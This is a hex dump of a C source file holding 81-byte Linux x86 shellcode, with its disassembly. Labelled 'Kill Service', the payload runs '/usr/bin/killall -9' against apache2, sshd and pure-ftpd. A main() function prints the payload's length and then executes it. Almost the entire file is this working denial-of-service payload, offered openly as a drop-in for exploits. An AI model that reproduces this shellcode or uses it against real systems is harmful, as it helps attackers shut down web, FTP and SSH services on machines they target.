00000000  2f 2a 20 20 4c 69 6e 75  78 20 78 38 36 20 7c 20  |/*  Linux x86 | |
00000010  4b 69 6c 6c 20 53 65 72  76 69 63 65 20 2d 20 41  |Kill Service - A|
00000020  70 61 63 68 65 32 0d 0a  20 2a 09 09 09 20 20 20  |pache2.. *...   |
00000030  20 20 2d 20 50 75 72 65  2d 46 74 70 64 0d 0a 20  |  - Pure-Ftpd.. |
00000040  2a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |*               |
00000050  20 20 20 20 20 20 20 20  20 20 20 20 2d 20 73 73  |            - ss|
00000060  68 64 0d 0a 20 2a 0d 0a  20 2a 20 20 53 68 65 6c  |hd.. *.. *  Shel|
00000070  6c 63 6f 64 65 20 38 31  20 62 79 74 65 73 0d 0a  |lcode 81 bytes..|
00000080  20 2a 20 20 41 75 68 74  6f 72 3a 20 4a 6f 6e 61  | *  Auhtor: Jona|
00000090  74 68 61 6e 20 53 61 6c  77 61 6e 20 6a 73 2e 72  |than Salwan js.r|
000000a0  61 63 2e 70 72 6f 6a 65  74 20 5b 41 54 5d 20 67  |ac.projet [AT] g|
000000b0  6d 61 69 6c 2e 63 6f 6d  0d 0a 20 2a 20 20 57 65  |mail.com.. *  We|
000000c0  62 3a 20 68 74 74 70 3a  2f 2f 77 77 77 2e 73 68  |b: http://www.sh|
000000d0  65 6c 6c 2d 73 74 6f 72  6d 2e 6f 72 67 0d 0a 20  |ell-storm.org.. |
000000e0  2a 0d 0a 20 2a 0d 0a 20  2a 44 69 73 61 73 73 65  |*.. *.. *Disasse|
000000f0  6d 62 6c 79 20 6f 66 20  73 65 63 74 69 6f 6e 20  |mbly of section |
00000100  2e 74 65 78 74 3a 0d 0a  0d 0a 20 2a 20 30 38 30  |.text:.... * 080|
00000110  34 38 30 36 30 20 3c 5f  73 74 61 72 74 3e 3a 0d  |48060 <_start>:.|
00000120  0a 20 2a 20 38 30 34 38  30 36 30 3a 20 20 20 20  |. * 8048060:    |
00000130  20 20 20 36 61 20 30 62  20 20 20 20 20 20 20 20  |   6a 0b        |
00000140  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000150  20 20 24 30 78 62 0d 0a  20 2a 20 38 30 34 38 30  |  $0xb.. * 80480|
00000160  36 32 3a 20 20 20 20 20  20 20 35 38 20 20 20 20  |62:       58    |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 70 6f 70 20 20 20  20 25 65 61 78 0d 0a 20  |  pop    %eax.. |
00000190  2a 20 38 30 34 38 30 36  33 3a 20 20 20 20 20 20  |* 8048063:      |
000001a0  20 39 39 20 20 20 20 20  20 20 20 20 20 20 20 20  | 99             |
000001b0  20 20 20 20 20 20 20 20  20 63 6c 74 64 20 20 20  |         cltd   |
000001c0  20 20 20 20 0d 0a 20 2a  20 38 30 34 38 30 36 34  |    .. * 8048064|
000001d0  3a 20 20 20 20 20 20 20  35 32 20 20 20 20 20 20  |:       52      |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  70 75 73 68 20 20 20 25  65 64 78 0d 0a 20 2a 20  |push   %edx.. * |
00000200  38 30 34 38 30 36 35 3a  20 20 20 20 20 20 20 36  |8048065:       6|
00000210  61 20 33 32 20 20 20 20  20 20 20 20 20 20 20 20  |a 32            |
00000220  20 20 20 20 20 20 20 70  75 73 68 20 20 20 24 30  |       push   $0|
00000230  78 33 32 0d 0a 20 2a 20  38 30 34 38 30 36 37 3a  |x32.. * 8048067:|
00000240  20 20 20 20 20 20 20 36  36 20 36 38 20 36 38 20  |       66 68 68 |
00000250  36 35 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |65             p|
00000260  75 73 68 77 20 20 24 30  78 36 35 36 38 0d 0a 20  |ushw  $0x6568.. |
00000270  2a 20 38 30 34 38 30 36  62 3a 20 20 20 20 20 20  |* 804806b:      |
00000280  20 36 38 20 36 31 20 37  30 20 36 31 20 36 33 20  | 68 61 70 61 63 |
00000290  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
000002a0  24 30 78 36 33 36 31 37  30 36 31 0d 0a 20 2a 20  |$0x63617061.. * |
000002b0  38 30 34 38 30 37 30 3a  20 20 20 20 20 20 20 38  |8048070:       8|
000002c0  39 20 65 37 20 20 20 20  20 20 20 20 20 20 20 20  |9 e7            |
000002d0  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 25 65  |       mov    %e|
000002e0  73 70 2c 25 65 64 69 0d  0a 20 2a 20 38 30 34 38  |sp,%edi.. * 8048|
000002f0  30 37 32 3a 20 20 20 20  20 20 20 35 32 20 20 20  |072:       52   |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 20 70 75 73 68 20  20 20 25 65 64 78 0d 0a  |   push   %edx..|
00000320  20 2a 20 38 30 34 38 30  37 33 3a 20 20 20 20 20  | * 8048073:     |
00000330  20 20 36 38 20 37 33 20  37 33 20 36 38 20 36 34  |  68 73 73 68 64|
00000340  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000350  20 24 30 78 36 34 36 38  37 33 37 33 0d 0a 20 2a  | $0x64687373.. *|
00000360  20 38 30 34 38 30 37 38  3a 20 20 20 20 20 20 20  | 8048078:       |
00000370  38 39 20 65 35 20 20 20  20 20 20 20 20 20 20 20  |89 e5           |
00000380  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
00000390  65 73 70 2c 25 65 62 70  0d 0a 20 2a 20 38 30 34  |esp,%ebp.. * 804|
000003a0  38 30 37 61 3a 20 20 20  20 20 20 20 35 32 20 20  |807a:       52  |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003c0  20 20 20 20 70 75 73 68  20 20 20 25 65 64 78 0d  |    push   %edx.|
000003d0  0a 20 2a 20 38 30 34 38  30 37 62 3a 20 20 20 20  |. * 804807b:    |
000003e0  20 20 20 36 61 20 36 34  20 20 20 20 20 20 20 20  |   6a 64        |
000003f0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000400  20 20 24 30 78 36 34 0d  0a 20 2a 20 38 30 34 38  |  $0x64.. * 8048|
00000410  30 37 64 3a 20 20 20 20  20 20 20 36 38 20 32 64  |07d:       68 2d|
00000420  20 36 36 20 37 34 20 37  30 20 20 20 20 20 20 20  | 66 74 70       |
00000430  20 20 20 70 75 73 68 20  20 20 24 30 78 37 30 37  |   push   $0x707|
00000440  34 36 36 32 64 0d 0a 20  2a 20 38 30 34 38 30 38  |4662d.. * 804808|
00000450  32 3a 20 20 20 20 20 20  20 36 38 20 37 30 20 37  |2:       68 70 7|
00000460  35 20 37 32 20 36 35 20  20 20 20 20 20 20 20 20  |5 72 65         |
00000470  20 70 75 73 68 20 20 20  24 30 78 36 35 37 32 37  | push   $0x65727|
00000480  35 37 30 0d 0a 20 2a 20  38 30 34 38 30 38 37 3a  |570.. * 8048087:|
00000490  20 20 20 20 20 20 20 38  39 20 65 36 20 20 20 20  |       89 e6    |
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
000004b0  6f 76 20 20 20 20 25 65  73 70 2c 25 65 73 69 0d  |ov    %esp,%esi.|
000004c0  0a 20 2a 20 38 30 34 38  30 38 39 3a 20 20 20 20  |. * 8048089:    |
000004d0  20 20 20 35 32 20 20 20  20 20 20 20 20 20 20 20  |   52           |
000004e0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
000004f0  20 20 25 65 64 78 0d 0a  20 2a 20 38 30 34 38 30  |  %edx.. * 80480|
00000500  38 61 3a 20 20 20 20 20  20 20 36 36 20 36 38 20  |8a:       66 68 |
00000510  32 64 20 33 39 20 20 20  20 20 20 20 20 20 20 20  |2d 39           |
00000520  20 20 70 75 73 68 77 20  20 24 30 78 33 39 32 64  |  pushw  $0x392d|
00000530  0d 0a 20 2a 20 38 30 34  38 30 38 65 3a 20 20 20  |.. * 804808e:   |
00000540  20 20 20 20 38 39 20 65  31 20 20 20 20 20 20 20  |    89 e1       |
00000550  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000560  20 20 20 25 65 73 70 2c  25 65 63 78 0d 0a 20 2a  |   %esp,%ecx.. *|
00000570  20 38 30 34 38 30 39 30  3a 20 20 20 20 20 20 20  | 8048090:       |
00000580  35 32 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |52              |
00000590  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 25  |        push   %|
000005a0  65 64 78 0d 0a 20 2a 20  38 30 34 38 30 39 31 3a  |edx.. * 8048091:|
000005b0  20 20 20 20 20 20 20 36  38 20 36 63 20 36 31 20  |       68 6c 61 |
000005c0  36 63 20 36 63 20 20 20  20 20 20 20 20 20 20 70  |6c 6c          p|
000005d0  75 73 68 20 20 20 24 30  78 36 63 36 63 36 31 36  |ush   $0x6c6c616|
000005e0  63 0d 0a 20 2a 20 38 30  34 38 30 39 36 3a 20 20  |c.. * 8048096:  |
000005f0  20 20 20 20 20 36 38 20  32 66 20 36 62 20 36 39  |     68 2f 6b 69|
00000600  20 36 63 20 20 20 20 20  20 20 20 20 20 70 75 73  | 6c          pus|
00000610  68 20 20 20 24 30 78 36  63 36 39 36 62 32 66 0d  |h   $0x6c696b2f.|
00000620  0a 20 2a 20 38 30 34 38  30 39 62 3a 20 20 20 20  |. * 804809b:    |
00000630  20 20 20 36 38 20 32 66  20 36 32 20 36 39 20 36  |   68 2f 62 69 6|
00000640  65 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |e          push |
00000650  20 20 24 30 78 36 65 36  39 36 32 32 66 0d 0a 20  |  $0x6e69622f.. |
00000660  2a 20 38 30 34 38 30 61  30 3a 20 20 20 20 20 20  |* 80480a0:      |
00000670  20 36 38 20 32 66 20 37  35 20 37 33 20 37 32 20  | 68 2f 75 73 72 |
00000680  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000690  24 30 78 37 32 37 33 37  35 32 66 0d 0a 20 2a 20  |$0x7273752f.. * |
000006a0  38 30 34 38 30 61 35 3a  20 20 20 20 20 20 20 38  |80480a5:       8|
000006b0  39 20 65 33 20 20 20 20  20 20 20 20 20 20 20 20  |9 e3            |
000006c0  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 25 65  |       mov    %e|
000006d0  73 70 2c 25 65 62 78 0d  0a 20 2a 20 38 30 34 38  |sp,%ebx.. * 8048|
000006e0  30 61 37 3a 20 20 20 20  20 20 20 35 32 20 20 20  |0a7:       52   |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000700  20 20 20 70 75 73 68 20  20 20 25 65 64 78 0d 0a  |   push   %edx..|
00000710  20 2a 20 38 30 34 38 30  61 38 3a 20 20 20 20 20  | * 80480a8:     |
00000720  20 20 35 37 20 20 20 20  20 20 20 20 20 20 20 20  |  57            |
00000730  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000740  20 25 65 64 69 0d 0a 20  2a 20 38 30 34 38 30 61  | %edi.. * 80480a|
00000750  39 3a 20 20 20 20 20 20  20 35 35 20 20 20 20 20  |9:       55     |
00000760  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000770  20 70 75 73 68 20 20 20  25 65 62 70 0d 0a 20 2a  | push   %ebp.. *|
00000780  20 38 30 34 38 30 61 61  3a 20 20 20 20 20 20 20  | 80480aa:       |
00000790  35 36 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |56              |
000007a0  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 25  |        push   %|
000007b0  65 73 69 0d 0a 20 2a 20  38 30 34 38 30 61 62 3a  |esi.. * 80480ab:|
000007c0  20 20 20 20 20 20 20 35  31 20 20 20 20 20 20 20  |       51       |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
000007e0  75 73 68 20 20 20 25 65  63 78 0d 0a 20 2a 20 38  |ush   %ecx.. * 8|
000007f0  30 34 38 30 61 63 3a 20  20 20 20 20 20 20 35 33  |0480ac:       53|
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000810  20 20 20 20 20 20 70 75  73 68 20 20 20 25 65 62  |      push   %eb|
00000820  78 0d 0a 20 2a 20 38 30  34 38 30 61 64 3a 20 20  |x.. * 80480ad:  |
00000830  20 20 20 20 20 38 39 20  65 31 20 20 20 20 20 20  |     89 e1      |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000850  20 20 20 20 25 65 73 70  2c 25 65 63 78 0d 0a 20  |    %esp,%ecx.. |
00000860  2a 20 38 30 34 38 30 61  66 3a 20 20 20 20 20 20  |* 80480af:      |
00000870  20 63 64 20 38 30 20 20  20 20 20 20 20 20 20 20  | cd 80          |
00000880  20 20 20 20 20 20 20 20  20 69 6e 74 20 20 20 20  |         int    |
00000890  24 30 78 38 30 0d 0a 20  2a 0d 0a 20 2a 2f 0d 0a  |$0x80.. *.. */..|
000008a0  0d 0a 69 6e 74 20 6d 61  69 6e 28 69 6e 74 20 61  |..int main(int a|
000008b0  72 67 63 2c 20 63 68 61  72 20 2a 61 72 67 76 5b  |rgc, char *argv[|
000008c0  5d 29 0d 0a 09 7b 0d 0a  09 0d 0a 09 09 63 68 61  |])...{.......cha|
000008d0  72 20 73 68 65 6c 6c 5b  5d 20 3d 20 09 22 5c 78  |r shell[] = ."\x|
000008e0  36 61 5c 78 30 62 22 0d  0a 09 09 09 09 22 5c 78  |6a\x0b"......"\x|
000008f0  35 38 22 0d 0a 09 09 09  09 22 5c 78 39 39 22 0d  |58"......"\x99".|
00000900  0a 09 09 09 09 2f 2f 2d  2d 2d 2d 2d 2d 2d 2d 61  |.....//--------a|
00000910  70 61 63 68 65 32 0d 0a  09 09 09 09 22 5c 78 35  |pache2......"\x5|
00000920  32 22 0d 0a 09 09 09 09  22 5c 78 36 61 5c 78 33  |2"......"\x6a\x3|
00000930  32 22 0d 0a 09 09 09 09  22 5c 78 36 36 5c 78 36  |2"......"\x66\x6|
00000940  38 5c 78 36 38 5c 78 36  35 22 0d 0a 09 09 09 09  |8\x68\x65"......|
00000950  22 5c 78 36 38 5c 78 36  31 5c 78 37 30 5c 78 36  |"\x68\x61\x70\x6|
00000960  31 5c 78 36 33 22 0d 0a  09 09 09 09 22 5c 78 38  |1\x63"......"\x8|
00000970  39 5c 78 65 37 22 0d 0a  09 09 09 09 2f 2f 2d 2d  |9\xe7"......//--|
00000980  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0d 0a 09  |-------------...|
00000990  09 09 09 2f 2f 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |...//-----------|
000009a0  73 73 68 64 0d 0a 09 09  09 09 22 5c 78 35 32 22  |sshd......"\x52"|
000009b0  0d 0a 09 09 09 09 22 5c  78 36 38 5c 78 37 33 5c  |......"\x68\x73\|
000009c0  78 37 33 5c 78 36 38 5c  78 36 34 22 0d 0a 09 09  |x73\x68\x64"....|
000009d0  09 09 22 5c 78 38 39 5c  78 65 35 22 0d 0a 09 09  |.."\x89\xe5"....|
000009e0  09 09 2f 2f 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |..//------------|
000009f0  2d 2d 2d 0d 0a 09 09 09  09 2f 2f 2d 2d 2d 2d 2d  |---......//-----|
00000a00  2d 70 75 72 65 2d 66 74  70 64 0d 0a 09 09 09 09  |-pure-ftpd......|
00000a10  22 5c 78 35 32 22 0d 0a  09 09 09 09 22 5c 78 36  |"\x52"......"\x6|
00000a20  61 5c 78 36 34 22 0d 0a  09 09 09 09 22 5c 78 36  |a\x64"......"\x6|
00000a30  38 5c 78 32 64 5c 78 36  36 5c 78 37 34 5c 78 37  |8\x2d\x66\x74\x7|
00000a40  30 22 0d 0a 09 09 09 09  22 5c 78 36 38 5c 78 37  |0"......"\x68\x7|
00000a50  30 5c 78 37 35 5c 78 37  32 5c 78 36 35 22 0d 0a  |0\x75\x72\x65"..|
00000a60  09 09 09 09 22 5c 78 38  39 5c 78 65 36 22 0d 0a  |...."\x89\xe6"..|
00000a70  09 09 09 09 2f 2f 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |....//----------|
00000a80  2d 2d 2d 2d 2d 0d 0a 09  09 09 09 22 5c 78 35 32  |-----......"\x52|
00000a90  22 0d 0a 09 09 09 09 22  5c 78 36 36 5c 78 36 38  |"......"\x66\x68|
00000aa0  5c 78 32 64 5c 78 33 39  22 0d 0a 09 09 09 09 22  |\x2d\x39"......"|
00000ab0  5c 78 38 39 5c 78 65 31  22 0d 0a 09 09 09 09 22  |\x89\xe1"......"|
00000ac0  5c 78 35 32 22 0d 0a 09  09 09 09 22 5c 78 36 38  |\x52"......"\x68|
00000ad0  5c 78 36 63 5c 78 36 31  5c 78 36 63 5c 78 36 63  |\x6c\x61\x6c\x6c|
00000ae0  22 0d 0a 09 09 09 09 22  5c 78 36 38 5c 78 32 66  |"......"\x68\x2f|
00000af0  5c 78 36 62 5c 78 36 39  5c 78 36 63 22 0d 0a 09  |\x6b\x69\x6c"...|
00000b00  09 09 09 22 5c 78 36 38  5c 78 32 66 5c 78 36 32  |..."\x68\x2f\x62|
00000b10  5c 78 36 39 5c 78 36 65  22 0d 0a 09 09 09 09 22  |\x69\x6e"......"|
00000b20  5c 78 36 38 5c 78 32 66  5c 78 37 35 5c 78 37 33  |\x68\x2f\x75\x73|
00000b30  5c 78 37 32 22 0d 0a 09  09 09 09 22 5c 78 38 39  |\x72"......"\x89|
00000b40  5c 78 65 33 22 0d 0a 09  09 09 09 22 5c 78 35 32  |\xe3"......"\x52|
00000b50  22 0d 0a 09 09 09 09 22  5c 78 35 37 22 0d 0a 09  |"......"\x57"...|
00000b60  09 09 09 22 5c 78 35 35  22 0d 0a 09 09 09 09 22  |..."\x55"......"|
00000b70  5c 78 35 36 22 0d 0a 09  09 09 09 22 5c 78 35 31  |\x56"......"\x51|
00000b80  22 0d 0a 09 09 09 09 22  5c 78 35 33 22 0d 0a 09  |"......"\x53"...|
00000b90  09 09 09 22 5c 78 38 39  5c 78 65 31 22 0d 0a 09  |..."\x89\xe1"...|
00000ba0  09 09 09 22 5c 78 63 64  5c 78 38 30 22 3b 0d 0a  |..."\xcd\x80";..|
00000bb0  0d 0a 09 70 72 69 6e 74  66 28 22 4c 65 6e 67 74  |...printf("Lengt|
00000bc0  68 3a 20 25 64 5c 6e 22  2c 73 74 72 6c 65 6e 28  |h: %d\n",strlen(|
00000bd0  73 68 65 6c 6c 29 29 3b  0d 0a 09 28 2a 28 76 6f  |shell));...(*(vo|
00000be0  69 64 28 2a 29 28 29 29  20 73 68 65 6c 6c 29 28  |id(*)()) shell)(|
00000bf0  29 3b 0d 0a 09 0d 0a 09  72 65 74 75 72 6e 20 30  |);......return 0|
00000c00  3b 0d 0a 7d                                       |;..}|
00000c04
